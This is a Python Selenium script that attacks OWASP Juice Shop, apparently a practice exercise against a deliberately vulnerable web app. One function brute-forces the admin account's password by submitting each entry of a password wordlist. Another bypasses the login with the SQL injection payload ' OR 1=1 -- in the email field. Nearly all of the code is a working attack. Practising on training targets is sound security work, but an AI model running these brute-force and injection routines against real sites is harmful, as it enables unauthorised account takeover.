from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time




def main():
    # Initialize the WebDriver
    driver = webdriver.Chrome()  # Use the browser of your choice (e.g., Firefox, Edge)

    # Open the webpage
    driver.get("https://juice-shop.herokuapp.com/#/")

    # Wait for and dismiss the overlay
    try:
        dismissBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "mat-focus-indicator.mat-raised-button.mat-warn"))
        )
        dismissBtn.click()
        print("Overlay dismissed.")
    except Exception as e:
        print(f"Could not dismiss the overlay: {e}")

    # logInAdminSql(driver)
    bruteForcePassword(driver)
    # Close the browser
    input("Press Enter to close the browser...")
    driver.quit()
    exit()

def bruteForcePassword(driver):
        # Attempt to log in
    try:

        acctBtn = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "navbarAccount"))
        )
        acctBtn.click()

        logInBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
        )
        logInBtn.click()
    except Exception as e:
        print(f"Could not click log in buttons: {e}")

    emailField = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "email"))
    )
    emailField.send_keys("admin@juice-sh.op")
    # Open file and test each password
    with open("genericPasswords.txt") as f:
        for password in f:
            try:
                print(f"Trying password: {password}")
                passwordField = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "password"))
                )
                passwordField.clear()
                passwordField.send_keys(password)
                passwordField.send_keys(Keys.RETURN)
            except Exception as e:
                print(f"Could not enter text: {e}")

            # Check if the login was successful
            try:
                invalidDiv = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CLASS_NAME, "error.ng-star-inserted"))
                )
            except Exception as e:
                print(f"Could not find invalid text: {e}")


def logInAdminSql(driver):
    

    # Attempt to log in
    try:

        acctBtn = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "navbarAccount"))
        )
        acctBtn.click()

        logInBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
        )
        logInBtn.click()

        emailField = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "email"))
        )
        emailField.send_keys("\' OR 1=1 --")
        passwordField = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "password"))
        )
        passwordField.send_keys("password")
        passwordField.send_keys(Keys.RETURN)
    except Exception as e:
        print(f"Could not enter text: {e}")

if __name__ == "__main__":
    main()



